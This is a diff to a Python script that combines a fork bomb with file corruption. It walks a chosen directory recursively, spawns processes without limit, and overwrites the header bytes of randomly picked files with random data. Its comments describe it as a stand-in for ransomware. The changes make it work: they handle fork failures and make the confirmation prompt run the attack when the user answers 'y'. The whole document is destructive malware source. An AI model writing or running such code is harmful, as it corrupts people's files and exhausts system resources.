@@ -4,32 +4,49 @@ import glob
 
 def scan(directory):
     #Simple function originally much more complicated
-    targets = glob.glob(join(directory,"/**/*"), recursive=True)
+    targets = glob.glob(''.join([directory,"/**/*"]), recursive=True)
     fileTargets = [f for f in targets if os.path.isfile(f)]
     return fileTargets
 
-def scramble(file):
+def scramble(file, target):
+    global targets
     #In real ransomware this would be replaced by some type of encryption
     #instead of just randomly breaking the header
     try:
         with open(file, "rb+") as f:
             f.write(os.urandom(16))
     except Exception as e:
+        #Don't target a file we can't touch(probably system32 or other important file)
         pass
 
 def bomb():
     global targets
-    scramble(random.choice(targets))
+    target = random.randint(0, len(targets)-1)
+    scramble(targets[target], target)
 
 def split():
-    child1 = os.fork()
+    child1 = -1
+    child2 = -1
+    try:
+        child1 = os.fork()
+    except:
+        #There isn't any room for it
+        pass
     if child1 == 0:
         bomb()
-        split()
-    child2 = os.fork()
+        split_mask()
+    try:
+        child2 = os.fork()
+    except:
+        #There is no room for it
+        pass
     if child2 == 0:
         bomb()
-        split()
+        split_mask()
+
+def split_mask():
+    split()
+
 
 def createBombers(directory):
     #This is the main function that starts all the problems
@@ -45,8 +62,8 @@ def createBombers(directory):
         #Doesn't matter lets keep going
         pass
 
-if __name__ == "__main__" and not input("Confirm fork bomb? [y/n]:").lower() == 'y':
+if __name__ == "__main__" and input("Confirm fork bomb? [y/n]:").lower() == 'y':
     #One last saftey before bombing
-    targetDirectory = "/your/path/goes/here"
+    targetDirectory = input("DO NOT PUT ~/ or C:/ THAT COULD CRUSH EVERY FILE\nTarget Directory:")
     targets = scan(targetDirectory)
     createBombers(targetDirectory)
